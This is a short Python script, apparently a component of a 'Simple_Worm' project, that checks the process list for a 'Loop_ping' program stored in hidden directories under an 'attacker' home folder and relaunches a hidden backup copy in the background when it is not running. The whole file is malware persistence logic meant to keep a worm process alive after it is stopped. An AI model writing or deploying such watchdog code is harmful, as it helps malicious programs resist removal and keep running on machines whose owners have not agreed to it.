import os
import subprocess
import string
import distutils.spawn


def is_tool(name):
  return distutils.spawn.find_executable(name) is not None

program = os.popen('ps -ef | grep "Loop_ping"').read()

if not is_tool('/home/attacker/Public/.Simple_Worm/Loop_ping'):
	if program.find('/home/attacker/Public/.Simple_Worm/Loop_ping') < 0 and program.find('/home/attacker/Desktop/.Backup/Loop_ping') < 0:
		os.system('/home/attacker/Desktop/.Backup/Loop_ping &')
	

